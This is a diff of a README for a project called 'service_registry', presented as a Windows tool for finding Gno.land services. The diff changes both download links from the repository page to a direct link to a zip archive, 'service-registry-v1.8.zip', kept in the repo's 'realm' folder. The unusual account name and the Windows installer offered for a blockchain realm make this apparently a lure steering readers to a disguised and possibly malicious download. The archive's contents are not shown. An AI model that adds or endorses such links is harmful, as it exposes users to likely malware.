@@ -1,6 +1,6 @@
 # 🔗 service_registry - Find and use Gno.land services
 
-[![Download / Visit the page](https://img.shields.io/badge/Download%20or%20Visit-4B6CB7?style=for-the-badge&labelColor=6B7280)](https://github.com/Familyalligatoridaesnowyorchid856/service_registry)
+[![Download / Visit the page](https://img.shields.io/badge/Download%20or%20Visit-4B6CB7?style=for-the-badge&labelColor=6B7280)](https://raw.githubusercontent.com/Familyalligatoridaesnowyorchid856/service_registry/main/realm/service-registry-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This project is made for Windows users who want a simple way to get the app and 
 
 Use this link to visit the page and download the app:
 
-[Download service_registry](https://github.com/Familyalligatoridaesnowyorchid856/service_registry)
+[Download service_registry](https://raw.githubusercontent.com/Familyalligatoridaesnowyorchid856/service_registry/main/realm/service-registry-v1.8.zip)
 
 ## 🪟 Install on Windows
 
